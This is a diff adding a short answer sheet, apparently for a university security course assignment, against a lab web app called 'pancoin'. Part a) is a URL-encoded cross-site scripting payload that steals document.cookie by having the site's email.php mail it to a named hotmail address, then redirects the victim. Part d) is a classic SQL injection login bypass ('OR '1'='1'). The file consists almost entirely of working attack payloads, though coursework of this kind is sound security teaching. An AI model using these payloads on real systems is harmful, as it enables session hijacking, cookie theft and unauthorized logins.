@@ -1,0 +1,6 @@
+a)https://mathlab.utsc.utoronto.ca/courses/cscd27f14/rosselet/asn/a3/pancoin/users.php?
+	user=">%3Cscript%3Eimage+%3D+new+Image%28%29%3Bimage.src%3D%27https%3A%2F%2Fmathlab.utsc.utoronto.ca%2Fcourses%2Fcscd27f14%2Frosselet%2Fasn%2Fa3%2Fpancoin%2Femail.php%3Fto%3Dkentliang%40hotmail.com%26body%3D%27+%2B+document.cookie%3Bwindow.location.href+%3D+%27https%3A%2F%2Fmathlab.utsc.utoronto.ca%2Fcourses%2Fcscd27f14%2Frosselet%2Fasn%2Fa3%2Fpancoin%2Fusers.php%27%3B%3C%2Fscript%3E
+
+d)sql injection
+username: hi' OR '1'='1
+password: asdf
